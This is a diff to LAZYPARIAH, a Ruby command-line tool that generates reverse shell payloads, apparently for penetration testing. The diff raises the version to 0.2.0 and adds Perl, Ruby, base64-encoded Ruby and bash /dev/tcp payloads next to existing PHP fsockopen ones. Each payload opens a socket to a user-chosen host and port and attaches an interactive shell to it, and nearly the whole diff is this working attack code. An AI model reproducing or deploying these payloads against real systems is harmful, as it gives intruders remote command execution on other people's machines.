@@ -1,7 +1,7 @@
 #!/usr/bin/env ruby
 #
 # Title: LAZYPARIAH
-# Version: 0.1.1
+# Version: 0.2.0
 # Description:
 #	LAZYPARIAH is a simple tool for generating various reverse shell payloads
 #	on the fly. It is intended to be used only in authorised circumstances by
@@ -27,7 +27,7 @@ require "erb"
 
 # Define constants.
 PROGRAM_NAME = "LAZYPARIAH".freeze()
-PROGRAM_VERSION = "0.1.1".freeze()
+PROGRAM_VERSION = "0.2.0".freeze()
 EXECUTABLE_NAME = "lazypariah".freeze()
 
 # Define payload list.
@@ -53,7 +53,12 @@ PAYLOAD_LIST = [
 	"php_fd_4_tags",
 	"php_fd_5_tags",
 	"php_fd_6_tags",
-	"php_dev_tcp_tags"
+	"perl",
+	"perl_c",
+	"ruby",
+	"ruby_c",
+	"ruby_b64",
+	"bash_tcp"
 ].sort()
 
 # Define function for displaying program information.
@@ -184,6 +189,19 @@ begin
 				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&5 >&5 2>&5\");?>", url_encode=url_encode)
 			when "php_fd_6_tags"
 				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&6 >&6 2>&6\");?>", url_encode=url_encode)
+			when "perl"
+				print_output("use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", url_encode=url_encode)
+			when "perl_c"
+				print_output("perl -e 'use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", url_encode=url_encode)
+			when "ruby"
+				print_output("require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end", url_encode=url_encode)
+			when "ruby_c"
+				print_output("ruby -e 'require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", url_encode=url_encode)
+			when "ruby_b64"
+				code = Base64.strict_encode64("require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end")
+				print_output("echo #{code} | base64 -d | ruby", url_encode=url_encode)
+			when "bash_tcp"
+				print_output("bash -i >& /dev/tcp/#{ARGV[1]}/#{ARGV[2]} 0>&1", url_encode=url_encode)
 			end
 		end
 	end
